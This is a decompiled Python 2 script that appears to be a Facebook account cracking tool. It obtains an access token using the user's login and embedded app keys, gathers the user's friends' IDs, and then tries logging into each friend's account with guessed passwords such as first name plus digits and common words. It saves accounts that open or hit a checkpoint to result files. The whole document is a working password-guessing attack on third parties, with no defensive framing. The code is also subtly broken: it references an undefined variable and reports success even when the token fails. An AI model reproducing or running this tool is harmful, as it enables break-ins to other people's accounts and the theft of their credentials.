# uncompyle6 version 3.6.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <Angga>
import requests, json, sys, os, hashlib, getpass
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('result')
except OSError:
    pass

r = '\x1b[91m'
y = '\x1b[93m'
g = '\x1b[92m'
b = '\x1b[94m'
h = '\x1b[96m'
target = []
toke = []
fin = []
live = []
die = []
crsh = []

def login():
    try:
        id = raw_input(g + '[+] Username : ')
        pwd = getpass.getpass(g + '[+] Password : ')
        N = '\x1b[0m'
        G = '\x1b[1;32m'
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig': x.hexdigest()})
        masuk = requests.get('https://api.facebook.com/restserver.php', params=data).json()
        try:
            token = masuk['access_token']
        except:
            print r + '[!] Failed generate access token!'

        print g + '[+] Success generate access token!'
        toke.append(token)
        for id in requests.get('https://graph.facebook.com/me/friends?access_token=' + token).json()['data']:
            target.append(id['id'])

    except KeyboardInterrupt:
        sys.exit()
    except requests.exceptions.ConnectionError:
        sys.exit()


def brute(tar):
    try:
        fn = requests.get('https://graph.facebook.com/' + tar + '?access_token=%s' % toke[0]).json()['first_name']
        fin.append(fn)
        for first in [fn + '123', fn + '12', 'sayang', 'bangsat', 'anjing', fn + '12345', 'kontol', 'sayangku']:
            ro = requests.post('https://mbasic.facebook.com/login', data={'email': tar, 'pass': first, 'login': 'submit'}).url
            if 'save-device' in ro or 'm_sess' in ro:
                live.append(tar)
                open('result/live.txt', 'a').write('%s|%s\n' % (tar, first))
                break
            elif 'checkpoint' in ro:
                die.append(tar)
                open('result/cek.txt', 'a').write('%s|%s\n' % (tar, first))
                break
            else:
                crsh.append(tar)
                break

        print r + '\r\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] = %s' % h + str(len(live)) + y + ' | \x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] = %s' % h + str(len(die)) + g + ' | [[ERROR]] = %s' % h + str(len(crsh)),
        sys.stdout.flush()
    except KeyboardInterrupt:
        if len(live) > 0 or len(die) > 0:
            print ' '
            print g + '[+] The results are stored in the result folder!'
            exit(y + pm)
        else:
            print ' '
            print y + pm
            print r + '[+] No results!!'
            exit(y + pm)
    except requests.exceptions.ConnectionError:
        exit(y + pm)


login()
tr = ThreadPool(int(input(g + '[+] Thread   : ')))
tr.map(brute, target)
if len(live) > 0 or len(die) > 0:
    print ' '
    print y + pm
    print g + '[+] The results are stored in the result folder!'
    print y + pm
else:
    print ' '
    print y + pm
    print r + '[+] No results!'
    print y + pm